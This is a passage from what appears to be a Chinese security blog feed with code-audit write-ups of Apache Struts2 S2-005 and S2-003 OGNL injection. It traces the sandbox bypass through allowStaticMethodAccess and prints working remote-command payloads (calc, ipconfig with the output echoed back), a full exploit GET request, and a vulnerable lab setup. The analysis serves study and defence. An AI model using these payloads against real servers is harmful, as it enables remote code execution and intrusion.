src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151454612.png" class title="image-20220127151454612"><p>按照之前的逻辑,此时children[0]的children[0]也就是@java.lang.Runtime@getRuntime().exec(‘calc’)是即将被执行的对象</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151605169.png" class title="image-20220127151605169"><p>从此往后一路跟踪到了关键的执行静态方法的代码部分,位于ASTStaticMethod.class</p><p>这部分过程和s2-s003几乎一样</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127151741866.png" class title="image-20220127151741866"><p>如果是S2-003,到这里执行OgnlRuntime.callStaticMethod就会直接弹出计算器了,可是在S2-S005中会直接抛出异常,why?导致抛出异常的原因就是我们payload失效的原因,我们进一步跟进分析</p><p>往下调用,调用栈为</p><p>OgnlRuntime.callStaticMethod-&gt;OgnlRuntime.callStaticMethod(ma.callStaticMethod)-&gt;XWorkMethodAccessor.callStaticMethod.callStaticMethodWithDebugInfo-&gt;ObjectMethodAccessor.callStaticMethod-&gt;ObjectMethodAccessor.OgnlRuntime.callAppropriateMethod-&gt;OgnlRuntime.callAppropriateMethod()</p><p>经过上图调用栈我们来到了OgnlRuntime.callAppropriateMethod()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">callAppropriateMethod</span><span class="params">(OgnlContext context, Object source, Object target, String methodName, String propertyName, List methods, Object[] args)</span> <span class="keyword">throws</span> MethodFailedException </span>&#123;</span><br><span class="line">    Throwable reason = <span class="keyword">null</span>;</span><br><span class="line">    Object[] actualArgs = _objectArrayPool.create(args.length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Method method = getAppropriateMethod(context, source, target, propertyName, methods, args, actualArgs);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="keyword">null</span> || !isMethodAccessible(context, source, method, propertyName)) &#123;</span><br><span class="line">            StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            String className = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (target != <span class="keyword">null</span>) &#123;</span><br><span class="line">                className = target.getClass().getName() + <span class="string">&quot;.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> ilast = args.length - <span class="number">1</span>; i &lt;= ilast; ++i) &#123;</span><br><span class="line">                Object arg = args[i];</span><br><span class="line">                buffer.append(arg == <span class="keyword">null</span> ? NULL_STRING : arg.getClass().getName());</span><br><span class="line">                <span class="keyword">if</span> (i &lt; ilast) &#123;</span><br><span class="line">                    buffer.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(className + methodName + <span class="string">&quot;(&quot;</span> + buffer + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object[] convertedArgs = actualArgs;</span><br><span class="line">        <span class="keyword">if</span> (isJdk15() &amp;&amp; method.isVarArgs()) &#123;</span><br><span class="line">            Class[] parmTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; parmTypes.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (parmTypes[i].isArray()) &#123;</span><br><span class="line">                    convertedArgs = <span class="keyword">new</span> Object[i + <span class="number">1</span>];</span><br><span class="line">                    System.arraycopy(actualArgs, <span class="number">0</span>, convertedArgs, <span class="number">0</span>, convertedArgs.length);</span><br><span class="line">                    Object[] varArgs;</span><br><span class="line">                    <span class="keyword">if</span> (actualArgs.length &lt;= i) &#123;</span><br><span class="line">                        varArgs = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ArrayList varArgsList = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; actualArgs.length; ++j) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (actualArgs[j] != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                varArgsList.add(actualArgs[j]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        varArgs = varArgsList.toArray();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    convertedArgs[i] = varArgs;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object var26 = invokeMethod(target, method, convertedArgs);</span><br><span class="line">        <span class="keyword">return</span> var26;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var21) &#123;</span><br><span class="line">        reason = var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var22) &#123;</span><br><span class="line">        reason = var22;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var23) &#123;</span><br><span class="line">        reason = var23.getTargetException();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        _objectArrayPool.recycle(actualArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> MethodFailedException(source, methodName, (Throwable)reason);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现这里面由两个if判断,在这两个if判断之后就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object var26 &#x3D; invokeMethod(target, method, convertedArgs);</span><br></pre></td></tr></table></figure><p>正是这一行代码最终调用了我们的静态方法,前面说了,我们无法执行静态方法的原因是因为会抛出异常,那么在这段代码里面是在那个地方抛出了异常呢?我们回到debug模式上</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127152905933.png" class title="image-20220127152905933"><p>在第进入第一个if后会来到一个for循环,此处定义了一个ilast,它等于args的长度-1,而此时args的长度是0,也就是说这里的ilast等于-1,i在上面已经等于0了,也就是说永远不可能满足0&lt;=-1这样的条件,到这里直接就抛出异常,终止调用.</p><p>如何让这个地方不报错呢?我想到最直接的办法就是有没有办法能不经过这个if判断,让第一个if判断为false直接绕过呢?接下来我把重点放在了if判断的条件里面</p><p>if判断的条件是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method &#x3D;&#x3D; null || !isMethodAccessible(context, source, method, propertyName)</span><br></pre></td></tr></table></figure><p>想让if不执行,那我们就需要</p><p>1.让method不等于null或者isMethodAccessible(context, source, method, propertyName)返回true,而此时method本来就不等于null,所以我们需要想办法让isMethodAccessible(context, source, method, propertyName)返回true</p><p>跟进isMethodAccessible()</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127153805630.png" class title="image-20220127153805630"><p>可以看到此时我们需要让context.getMemberAccess().isAccessible(context, target, method, propertyName)返回true</p><p>继续跟进context.getMemberAccess()</p><p>可以看到返回了一个_memberAccess,从debug下面来看与S2-003是由很大不同的,可以看到我们现在多了一个SecurityMemberAccess对象(_memberAccess),可以看到这个是属于OgnlContext的,也就是说他也是和context同级别,并且_memberAccess不是hashmap,里面的值都是成员变量与变量值的关系而不是键值对的关系,也就是说我们现在可以通过#_memberAccess.xxx=xxx的形式来修改这里面的成员变量的值<img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127153927604.png" class title="image-20220127153927604"></p><p>得到了SecurityMemberAccess对象后接着调用它的isAccessible方法</p><p>跟进</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155038151.png" class title="image-20220127155038151"><p>可以看到allow初始值为true,如果在第一个大的if里面变为了false,那么就会在第二个大的if直接被return false</p><p>而我们需要他返回true,看到第一个大if里面的第一个子if,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (member instanceof Method &amp;&amp; !getAllowStaticMethodAccess()) </span><br></pre></td></tr></table></figure><p>如果这个if不被执行那我们就可以直接得到一个值为true的(allow,member instanceof Method) 已经为true了现在只需要让!getAllowStaticMethodAccess()为false也就是让getAllowStaticMethodAccess()为true</p><p>跟进getAllowStaticMethodAccess()</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155416334.png" class title="image-20220127155416334"><p>可以看到他获取了SecurityMemberAccess中的alloStaticMethodAccess作为返回值,这里是我们可控的,我们可以执行ognl表达式将这里改成true,现在我手动在debug模式下将它改为true,然后观察执行过程</p><p>修改完毕后直接跳过三个if来到了最后一行<img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155850764.png" class title="image-20220127155850764"></p><p>跟进</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127155925171.png" class title="image-20220127155925171"><p>此时满足条件,直接返回true</p><p>现在我们回到刚刚的地方</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127160014140.png" class title="image-20220127160014140"><p>此时723行处的if语句已经被我们绕过了,下面的if (isJdk15() &amp;&amp; method.isVarArgs())也没有执行,直接跳过,直接就来到了</p><img src="/2022/01/27/Struts2-S005%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/image-20220127160145191.png" class title="image-20220127160145191"><p>至此第一个静态方法已经调用成功,接下来通过同样的调用栈第二个静态方法触发计算器即可</p><p>通过以上分析可以发现主要是因为SecurityMemberAccess对象中的alloStaticMethodAccess为false导致整个调用方法的时候会抛出异常,因此只需要在S2-003payload的基础上修改SecurityMemberAccess中的alloStaticMethodAccess为true即可,并不像网上的那么复杂.</p><p>poc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(mengda)(mengda)&amp;(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>回显:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(&#39;\u0023_memberAccess.allowStaticMethodAccess\u003dtrue&#39;)(mengda)(mengda)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure><p>有的时候用旧的payload进行调试找到导致旧payload失效的原因再根据原因想办法解决是一种不错的思路,可能比正着看代码要方便不少.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;注:如果你跟我一样是个菜鸡并且没有看过S2-003,那么强烈建议去看一下S2-003的调用过程,我也有写,可以先看一下&lt;</summary>
      
    
    
    
    
    <category term="Java代码审计" scheme="https://men9da.cn/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Struts2" scheme="https://men9da.cn/tags/Struts2/"/>
    
    <category term="JAVA安全" scheme="https://men9da.cn/tags/JAVA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S2 003详细分析</title>
    <link href="https://men9da.cn/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/01/26/Struts2-S003%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</id>
    <published>2022-01-26T03:10:30.000Z</published>
    <updated>2022-03-07T11:47:46.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>S2-003是第我审计的第二个java漏洞,其中核心还是围绕着OGNL表达式注入的利用,在我的”Struts2-S001”中以一种初学者的理解讲解了ognl表达式的用法,如果说S2-001的作用是让我大概了解了Struts2的执行流程,那么这次的S2-003让我深入了解了ognl的执行原理,网上对于S2-003的解释十分有限,内容不相同的文章就没有几篇,其中有一些我认为很复杂的概念没有讲出来,导致整个利用原理让人摸不着头脑,为什么payload形如(one)(two)?这些括号的意义是什么?为什么ognl就会解析one,而不会解析two呢,为什么(one)(two)(three)甚至是(one)(two)(three)(four)…也是可以成功执行的呢?这涉及以下几个核心概念,本篇文章会在恰当的地方进行解释.</p><p>1.什么是ASTchain,他长什么样?</p><p>2.ognl是如何解析各种类型的AST的</p><p>3.payload被解析为ASTchain后是什么一个形式</p><p>4.payload的解析顺序</p><h1 id="0X01-利用过程-amp-环境搭建"><a href="#0X01-利用过程-amp-环境搭建" class="headerlink" title="0X01:利用过程&amp;环境搭建"></a>0X01:利用过程&amp;环境搭建</h1><p>先写利用过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;Struts2-s003&#x2F;login.action?(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda) HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(mengda)(mengda)&amp;(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))(mengda)(mengda)</span><br></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#39;\u0023context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]\u003dfalse&#39;)(bla)(bla)&amp;(&#39;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#39;)(kxlzx)(kxlzx)&amp;(&#39;\u0023mycmd\u003d\&#39;ipconfig\&#39;&#39;)(bla)(bla)&amp;(&#39;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#39;)(bla)(bla)&amp;(A)((&#39;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#39;)(bla))&amp;(B)((&#39;\u0023myres\u003dnew\40byte[51020]&#39;)(bla))&amp;(C)((&#39;\u0023mydat.readFully(\u0023myres)&#39;)(bla))&amp;(D)((&#39;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#39;)(bla))&amp;(&#39;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#39;)(bla)(bla)&amp;(E)((&#39;\u0023myout.getWriter().println(\u0023mystr)&#39;)(bla))</span><br></pre></td></tr></table></figure><p>通过poc已经注意到了poc形如(one)(two)(three)形式,并且带有unicode编码,后面会详细分析</p><h6 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h6><p>很多文章都没有写如何搭建环境,都是下载现成的,我觉得自己搭建环境对理解整个漏洞逻辑是非常有必要的,所以简单讲解了一下所需环境和所需配置文件,同样的使用idea的maven一键搭建即可</p><p>我们需要一个action,具体如何创建action百度”Struts2 action”,Struts2就好比j2ee的servlet,创建action是因为我们需要调用Struts2的doIntercept方法处理传参,而测试漏洞我们需要一个传参对象(login.action),这里我们创建一个login.action</p><p>虽然叫login.action但是并没有任何功能,源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loginaction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">loginaction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;abd&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>structs.xml如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;s2-003&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;demo.action.loginaction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure><p>pom.xml如下:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Struts2-s003<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Struts2-s003<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Struts 2 Starter<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">struts2.version</span>&gt;</span>2.0.11.1<span class="tag">&lt;/<span class="name">struts2.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">log4j2.version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">log4j2.version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.11.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>Struts2<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span><span class="comment">&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-clean-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- see http://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_war_packaging --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span 